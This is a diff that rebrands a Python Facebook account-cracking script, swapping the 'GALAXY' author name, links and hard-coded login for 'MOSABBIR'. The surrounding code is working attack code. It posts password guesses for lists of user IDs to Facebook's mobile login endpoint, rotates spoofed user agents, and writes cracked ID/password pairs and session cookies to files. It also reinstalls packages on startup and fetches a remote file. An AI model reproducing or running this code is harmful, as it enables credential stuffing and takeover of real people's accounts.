@@ -15,7 +15,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ GALAXY ]-------------------#
+ #------------------[ MOSABBIR ]-------------------#
 import os, platform, time, sys
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
@@ -29,15 +29,15 @@ print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50mCHECKING FOR UPDATE...?
 os.system("espeak -a 300 \"Checking,For,Update,\"")
 time.sleep(2)
 #os.system('clear')
-print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 9.1...! ')
+print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 0.1...! ')
 os.system("espeak -a 300 \"UPDATE VERSION 0.1,\"")
 time.sleep(2)
 #os.system('clear')
 print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
 os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
 time.sleep(2)
-os.system(f'xdg-open https://youtube.com/@Galaxy_90x')
-os.system(f'xdg-open https://www.facebook.com/Galaxy.Gamer.90.X')
+os.system(f'xdg-open https://https://youtube.com/@bastehoilejantehobe?si=GNfEpJDEmqkP7zOD')
+os.system(f'xdg-open https://www.facebook.com/MOSABBIR2025')
 
 ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
 ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",]
@@ -539,8 +539,8 @@ for xd in range(10000):
   "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2)",
   "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100))",
   "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD))",
-  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3)",
-  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39))",
+  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MOSABBIR Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3)",
+  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; MOSABBIR Nexus Build/JDQ39))",
   "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60)",
   "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D))",
   "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5))",
@@ -1215,9 +1215,9 @@ for xd in range(10000):
 
   "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
 
-  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
+  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MOSABBIR Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3",
 
-  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
+  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; MOSABBIR Nexus Build/JDQ39)",
 
   "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60",
 
@@ -1292,7 +1292,7 @@ cokbrut=[]
 ses=requests.Session()
 prinCP=[]
 try:
-    prox= requests.get('https://raw.githubusercontent.com/galaxy90v/Approval/main/Approval.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/MOSABBIR90v/Approval/main/Approval.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -1534,7 +1534,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://raw.githubusercontent.com/galaxy90v/Approval/main/Approval.txt').text
+        a=requests.get('https://raw.githubusercontent.com/MOSABBIR90v/Approval/main/Approval.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -1547,7 +1547,7 @@ pwpluss,pwnya=[],[]
  
  
 
-#------------[ GALAXY ]--------------#
+#------------[ MOSABBIR ]--------------#
  
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -1636,14 +1636,14 @@ def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system('https://t.me/Free_Style_90')
+os.system('https://t.me/quotexfreesignal_mosabbir')
 logo ="""
-  ________       .__                        
- /  _____/_____  |  | _____  ___  ______.__.
-/   \  ___\__  \ |  | \__  \ \  \/  <   |  |
-\    \_\  \/ __ \|  |__/ __ \_>    < \___  |
- \______  (____  /____(____  /__/\_ \/ ____|
-        \/     \/          \/      \/\/     v9.1
+  __  __                 _     _     _      
+ |  \/  |               | |   | |   (_)     
+ | \  / | ___  ___  __ _| |__ | |__  _ _ __ 
+ | |\/| |/ _ \/ __|/ _` | '_ \| '_ \| | '__|
+ | |  | | (_) \__ \ (_| | |_) | |_) | | |   
+ |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   v0.1
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 \033[1;31m● \x1b[38;5;46m𝗔𝗦𝗛𝗜𝗞 / 𝗚𝗔𝗟𝗔𝗫𝗬 𝟵𝟬𝗫
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m● \x1b[38;5;46m𝗵𝘁𝘁𝗽𝘀://𝗴𝗶𝘁𝗵𝘂𝗯.𝗰𝗼𝗺/𝗴𝗮𝗹𝗮𝘅𝘆𝟵𝟬𝘃
@@ -1659,8 +1659,6 @@ fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸�
 xudinaministar =(""" \033[38;1m[-] 𝗜𝗠𝗣𝗢𝗥𝗧𝗘𝗡𝗧 𝗡𝗢𝗧𝗘""")
 hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 𝙰𝙱𝙰𝙻🤡 """)
 
-                  
-#os.system("python G-ULTRA.py")
 def naima():
 	print('-------------------')
 print(logo)
@@ -1677,8 +1675,8 @@ attemps = 0
 while attemps < 12345677901:
     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m 𝗘𝗡𝗧𝗘𝗥 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: ')
     password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m 𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ')
-
-    if username == 'GALAXY' and password == 'WORLD':
+    
+    if username == 'Mosabbir' and password == 'PRO':
         print(' \033[0;95m𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡.')
         os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
         break
@@ -1773,7 +1771,7 @@ def menu():
     elif WASIM in ['1']:
         crack_file()
     elif WASIM in ['2','02']:
-        os.system('xdg-open https://github.com/galaxy90v')
+        os.system('xdg-open https://github.com/MOSABBIR90v')
         os.system("python nono.py")
     elif WASIM in ['3','03']:
         result()
@@ -1788,7 +1786,7 @@ def menu():
         animation(' [×] 𝗦𝗘𝗟𝗘𝗖𝗧 𝗖𝗢𝗥𝗥𝗘𝗖𝗧𝗟𝗬 ')
         back()
  
-      #-----------------[ ASHIK-CRACK ]-----------------#
+      #-----------------[ MOSABBIR-CRACK ]-----------------#
  
 def result():
     os.system('clear')
@@ -1911,7 +1909,7 @@ def result():
 def crack_file():
     print('\033[0;93m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/galaxy.txt ]')
+    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/MOSABBIR.txt ]')
     o = input('\033[95;1m[\033[92;1m+\033[95;1m] 𝗜𝗡𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘 :\033[95;1m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -1958,7 +1956,7 @@ def setting():
     print("\033[93;1m[\033[93;1m2\033[93;1m] 𝗠𝗘𝗧𝗛𝗢𝗗 𝟮[\034𝗢𝗟𝗗 𝗩𝗘𝗥𝗦𝗜𝗢𝗡\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[95;1m[\033[92;1m•\033[95;1m] 𝗖𝗛𝗢𝗢𝗦𝗘 : ')
-    #os.system("xdg-open https://www.facebook.com/Galaxy.Gamer.90.X")
+    #os.system("xdg-open https://www.facebook.com/MOSABBIR2025")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -2088,7 +2086,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\033[100;95m{bo}[𝗚-𝗨𝗟𝗧𝗥𝗔•𝗠𝟭]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
+    sys.stdout.write(f"\r\033[100;95m{bo}[𝗚-Mosabbirpro•𝗠𝟭]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2105,7 +2103,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
+                print(f'\r\033[38;5;46m[𝗚-Mosabbirpro-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2115,7 +2113,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
+                print(f'\r\033[38;5;46m[𝗚-Mosabbirpro-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
@@ -2130,7 +2128,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[𝗚-𝗨𝗟𝗧𝗥𝗔•𝗠𝟮]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[𝗚-Mosabbirpro•𝗠𝟮]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2147,7 +2145,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗖𝗣🔒] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-Mosabbirpro-𝗖𝗣🔒] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2157,7 +2155,7 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-Mosabbirpro-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
